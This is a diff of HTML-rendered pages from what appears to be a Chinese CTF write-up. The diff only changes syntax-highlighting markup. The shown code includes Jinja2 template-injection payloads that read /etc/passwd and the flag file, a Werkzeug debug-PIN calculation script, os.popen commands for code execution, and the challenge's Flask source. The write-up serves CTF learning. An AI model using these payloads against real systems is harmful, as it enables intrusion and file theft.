-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 列举目录</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 列举目录</span>
 <span class="p">{{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="vm">__bases__</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()[</span><span class="mi">75</span><span class="p">]</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">][</span><span class="s1">&#39;__imp&#39;</span><span class="o">+</span><span class="s1">&#39;ort__&#39;</span><span class="p">](</span><span class="s1">&#39;o&#39;</span><span class="o">+</span><span class="s1">&#39;s&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)}}</span>
 </code></pre></td></tr></table></div>
 </div>
@@ -435,10 +435,10 @@ Method: GET</p>
 <p>payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span><span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/this_is_the_fl&#39;</span><span class="o">+</span><span class="s1">&#39;ag.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span><span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/this_is_the_fl&#39;</span><span class="o">+</span><span class="s1">&#39;ag.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h4 id="读取flag二字符倒序输出"><a href="#读取flag二字符倒序输出" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:读取flag二字符倒序输出" class="headings">读取flag二：字符倒序输出</a></h4>
@@ -446,10 +446,10 @@ Method: GET</p>
 <p>payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span><span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;txt.galf_eht_si_siht/&#39;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span><span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;txt.galf_eht_si_siht/&#39;</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><h3 id="解二pin码rce"><a href="#解二pin码rce" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:解二pin码rce" class="headings">解二：PIN码RCE</a></h3>
@@ -470,10 +470,10 @@ Method: GET</p>
 <p>      payload：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span><span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="p">[]</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="vm">__name__</span><span class="o">==</span><span class="s1">&#39;catch_warnings&#39;</span> <span class="o">%</span><span class="p">}{{</span><span class="n">c</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;__builtins__&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}{</span><span class="o">%</span> <span class="n">endif</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>获得<code>flaskweb:x:1000:1000::/home/flaskweb:/bin/sh</code>，可知当前登录名为flaskweb</p>
@@ -493,7 +493,7 @@ Method: GET</p>
 <p>贴一下大佬的&quot;召唤&quot;脚本：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -536,7 +536,7 @@ Method: GET</p>
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">hashlib</span>
 <span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
 <span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
     <span class="s1">&#39;flaskweb&#39;</span><span class="c1"># username</span>
@@ -561,13 +561,13 @@ Method: GET</p>
 
 <span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
 
-<span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
-<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+<span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
     <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
     <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
 
-<span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
-<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+<span class="n">rv</span> <span class="o">=</span><span class="kc">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
     <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
             <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
@@ -576,20 +576,20 @@ Method: GET</p>
     <span class="k">else</span><span class="p">:</span>
         <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>填入条件后生成PIN码：<code>193-401-638</code>。</p>
 <p>在调试界面打开shell，执行命令：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
 <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;ls /&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;cat /this_is_the_flag.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 <span class="c1"># 这里使用popen的原因是system不会产生回显</span>
@@ -618,7 +618,7 @@ Todo: add /admin/model_download button  下载模型</p>
 <p>下载模型之后看不懂。。。转去看源码，发现源码是随机显示一部分，但是好在位置固定，通过脚本复原即可：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -630,7 +630,7 @@ Todo: add /admin/model_download button  下载模型</p>
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
 <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://8567734a-8c12-4f70-bfee-6f10e978f956.node3.buuoj.cn/admin/source_thanos&#39;</span>
 <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
 <span class="n">source</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span>
@@ -639,13 +639,13 @@ Todo: add /admin/model_download button  下载模型</p>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">source</span><span class="p">)):</span>
         <span class="k">if</span> <span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">.</span><span class="n">isspace</span><span class="p">():</span>
             <span class="n">source</span> <span class="o">=</span> <span class="n">source</span><span class="p">[:</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">source</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">:]</span>
-<span class="k">print</span><span class="p">(</span><span class="n">source</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">source</span><span class="p">)</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>得到源码：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -817,7 +817,7 @@ Todo: add /admin/model_download button  下载模型</p>
 </span><span class="lnt">170
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding=utf8</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="c1"># coding=utf8</span>
 <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">flash</span><span class="p">,</span> <span class="n">send_file</span>
 <span class="kn">import</span> <span class="nn">random</span>
 <span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
@@ -826,7 +826,7 @@ Todo: add /admin/model_download button  下载模型</p>
 <span class="c1"># init app</span>
 <span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
 <span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="s2">&#34;il1I|&#34;</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
-<span class="k">print</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span><span class="p">)</span>
 
 <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Response</span>
 <span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">request</span><span class="p">,</span> <span class="n">session</span>
@@ -840,7 +840,7 @@ Todo: add /admin/model_download button  下载模型</p>
 <span class="n">site_description</span> <span class="o">=</span> <span class="s2">&#34;Just leave what you want to say.&#34;</span>
 
 <span class="c1"># %% tf/load.py</span>
-<span class="kn">import</span> <span class="nn">tensorflow</span> <span class="kn">as</span> <span class="nn">tf</span>
+<span class="kn">import</span> <span class="nn">tensorflow</span> <span class="k">as</span> <span class="nn">tf</span>
 <span class="kn">from</span> <span class="nn">tensorflow.python</span> <span class="kn">import</span> <span class="n">pywrap_tensorflow</span>
 
 
@@ -897,16 +897,16 @@ Todo: add /admin/model_download button  下载模型</p>
         <span class="n">template</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;$remembered_name&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">),</span> <span class="n">site_description</span><span class="o">=</span><span class="n">site_description</span><span class="p">,</span> <span class="n">site_title</span><span class="o">=</span><span class="n">site_title</span><span class="p">,</span> <span class="o">**</span><span class="n">args</span><span class="p">)</span>
 
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
     <span class="k">global</span> <span class="n">post_storage</span>
-    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="bp">False</span><span class="p">)</span>
+    <span class="n">session</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">)</span>
     <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">post_storage</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">20</span><span class="p">:</span>
         <span class="n">post_storage</span> <span class="o">=</span> <span class="n">post_storage</span><span class="p">[</span><span class="o">-</span><span class="mi">20</span><span class="p">:]</span>
     <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="n">posts</span><span class="o">=</span><span class="n">post_storage</span><span class="p">)</span>
 
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/post&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/post&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">add_post</span><span class="p">():</span>
     <span class="n">title</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;[no title]&#39;</span><span class="p">)</span>
     <span class="n">content</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span> <span class="s1">&#39;[no content]&#39;</span><span class="p">)</span>
@@ -924,17 +924,17 @@ Todo: add /admin/model_download button  下载模型</p>
     <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
 
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin/model_download&#39;</span><span class="p">)</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/admin/model_download&#39;</span><span class="p">)</span>
 <span class="k">def</span> <span class="nf">model_download</span><span class="p">():</span>
     <span class="s1">&#39;&#39;&#39;
 </span><span class="s1">    Download current model.
 </span><span class="s1">    &#39;&#39;&#39;</span>
-    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="bp">True</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="kc">True</span><span class="p">):</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s2">&#34;temp.zip&#34;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">z</span><span class="p">:</span>
                 <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="p">[</span><span class="s1">&#39;detection.meta&#39;</span><span class="p">,</span> <span class="s1">&#39;detection.index&#39;</span><span class="p">,</span> <span class="s1">&#39;detection.data-00000-of-00001&#39;</span><span class="p">]:</span>
                     <span class="n">z</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;tf/detection_model/&#39;</span><span class="o">+</span> <span class="n">e</span><span class="p">,</span> <span class="n">arcname</span><span class="o">=</span><span class="n">e</span><span class="p">)</span>
-            <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&#34;temp.zip&#34;</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">attachment_filename</span><span class="o">=</span><span class="s1">&#39;model.zip&#39;</span><span class="p">)</span>
+            <span class="k">return</span> <span class="n">send_file</span><span class="p">(</span><span class="s2">&#34;temp.zip&#34;</span><span class="p">,</span> <span class="n">as_attachment</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">attachment_filename</span><span class="o">=</span><span class="s1">&#39;model.zip&#39;</span><span class="p">)</span>
         <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
             <span class="n">flash</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
             <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">)</span>
@@ -942,21 +942,21 @@ Todo: add /admin/model_download button  下载模型</p>
         <span class="k">return</span> <span class="s2">&#34;Not a admin **session**. &lt;a href=&#39;/&#39;&gt;Back&lt;/a&gt;&#34;</span>
 
 
-<span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/admin&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
 <span class="k">def</span> <span class="nf">admin</span><span class="p">():</span>
     <span class="k">global</span> <span class="n">site_description</span><span class="p">,</span> <span class="n">site_title</span><span class="p">,</span> <span class="n">sess</span>
